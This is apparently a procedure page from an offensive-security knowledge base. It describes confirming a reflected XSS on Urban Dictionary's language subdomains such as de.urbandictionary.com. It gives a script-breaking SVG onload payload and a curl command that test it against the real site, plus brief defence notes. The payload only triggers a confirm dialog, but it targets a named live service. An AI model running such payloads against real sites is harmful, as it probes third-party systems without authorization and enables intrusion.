---
tags:
  - verification
  - xss
  - subdomain
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-test-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:52.777Z'
sub_techniques: []
id: 0f50b0f1-309b-487d-ad5b-6ef24f128aac
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Verify XSS on Language Subdomains

## Summary

This procedure tests the XSS payload on international subdomains like de.urbandictionary.com to confirm the vulnerability's scope across locales.

## Description

Subdomains share the same backend, reflecting input similarly. By adapting the URL to subdomain/define.php?term=<payload>, attackers verify consistent exploitation, expanding the attack surface for broader targeting.

## Requirements

1. Working payload from main domain
2. Access to subdomains
3. List of locales (e.g., de, fr)

## Defense

Defensive measures and detection strategies:

- Apply consistent sanitization across all subdomains
- Use subdomain-specific CSP headers
- Monitor cross-domain anomalous requests

## Objectives

1. Test payload on variants
2. Confirm uniform vulnerability
3. Assess full impact

## Instructions

### Step 1: Adapt URL

**Context**: Change host to subdomain.

URL: http://de.urbandictionary.com/define.php?term=</script><svg onload=confirm(document.domain)>

### Step 2: Execute Test

**Context**: Fetch and verify in browser.

**Command** ([[commands/curl-test-xss-payload]]):
```bash
curl "http://de.urbandictionary.com/define.php?term=%3C%2Fscript%3E%3Csvg%20onload%3Dconfirm(document.domain)%3E" | grep -i script
```

> Response shows injection; browser confirms execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-test-xss-payload]]

## Tools Used


## Tags

- [[verification]]
- [[xss]]
